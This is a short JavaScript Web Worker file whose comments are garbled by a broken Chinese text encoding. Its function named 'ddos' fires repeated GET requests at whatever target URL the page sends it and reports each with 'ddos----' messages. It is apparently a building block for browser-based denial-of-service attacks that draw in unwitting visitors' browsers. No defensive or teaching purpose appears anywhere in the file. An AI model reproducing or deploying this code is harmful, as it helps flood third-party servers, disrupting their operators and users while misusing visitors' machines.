//worker.js ��̨���ʹ�����������(CORS)
function makeGetRequest(target_url){
	var request=new XMLHttpRequest();        
      if(request)               
      {               
            request.open("GET",target_url,true);               
            request.onreadystatechange=function()               
            {               
                /*  if(request.readyState==4)               
                  {               
                       //           
                  }       
                  */        
           };               
              request.send(null);                        
        }               
       else
       {               
            //alert('Sorry,your browser doesn\'t support SMLHttpRequest');  //���ﲻ֧��alert����
        }               
}
function ddos(ddos_target){
  var i=0;
	for(i=0;i<=4;i++){
		makeGetRequest(ddos_target);
		postMessage( "ddos----"+ddos_target );
	}
	makeGetRequest(ddos_target);
		postMessage( "ddos----"+ddos_target );
	postMessage( "ddos finished" ); //��ִ�н�������Ϣ���ͻ����߳�
}
self.onmessage =function (evt){
  var d = evt.data;//ͨ��evt.data��÷�����������
  ddos(d);
}